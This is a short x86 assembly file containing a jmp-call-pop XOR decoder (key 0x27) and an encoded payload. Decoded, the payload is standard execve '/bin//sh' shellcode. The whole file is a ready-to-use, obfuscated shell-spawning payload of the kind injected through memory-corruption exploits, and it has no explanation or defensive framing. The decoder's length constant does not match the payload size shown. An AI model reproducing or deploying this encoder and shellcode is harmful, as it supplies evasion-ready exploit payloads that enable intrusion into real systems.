BITS 32
GLOBAL start

section .text

_start:
	jmp callback

main:
	xor 	ecx, ecx
	mov 	al, 0x27 ; key
	pop 	ebx

decrypt:
	cmp 	cl, 0x1b ; shellcode length
	ja 		cypher
	xor 	[ebx + ecx], al
	inc 	cl
	jmp decrypt

callback:
	call 	main

cypher:
	db 		0x16, 0xf5, 0x16, 0xee, 0x16
	db 		0xe7, 0x77, 0x4f, 0x08, 0x08
	db 		0x54, 0x4f, 0x4f, 0x08, 0x45
	db 		0x4e, 0x49, 0xae, 0xc4, 0x97
	db 		0x2c, 0xea, 0xa7
